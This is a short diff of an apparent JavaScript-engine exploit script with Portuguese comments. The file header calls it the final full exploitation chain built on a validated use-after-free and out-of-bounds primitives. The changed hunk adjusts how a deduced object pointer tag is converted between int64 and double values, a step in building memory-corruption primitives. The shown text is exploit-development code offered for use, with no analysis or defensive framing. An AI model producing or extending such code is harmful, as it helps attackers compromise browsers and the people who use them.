@@ -1,4 +1,5 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v153 - Refinamento do Spray UAF e Tamanho da Vítima - Testes Massivos)
+
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -288,7 +289,8 @@ async function deduceObjectPointerTag(logFn) {
     if (temp_addr_for_tag_test.high() < 0x10000) {
         tagged_temp_addr = new AdvancedInt64(temp_addr_for_tag_test.low(), temp_addr_for_tag_test.high() | JSVALUE_OBJECT_PTR_TAG_HIGH);
     }
-    const double_representation = _int64ToDouble_core(tagged_temp_addr);
+    // CORREÇÃO AQUI: Usar _int64ToDouble_direct
+    const double_representation = _int64ToDouble_direct(tagged_temp_addr);
     const reconverted_int64 = _doubleToInt64_direct(double_representation);
 
     // O high da `reconverted_int64` DEVE conter a tag se a conversão foi bem-sucedida e o valor é um ponteiro.
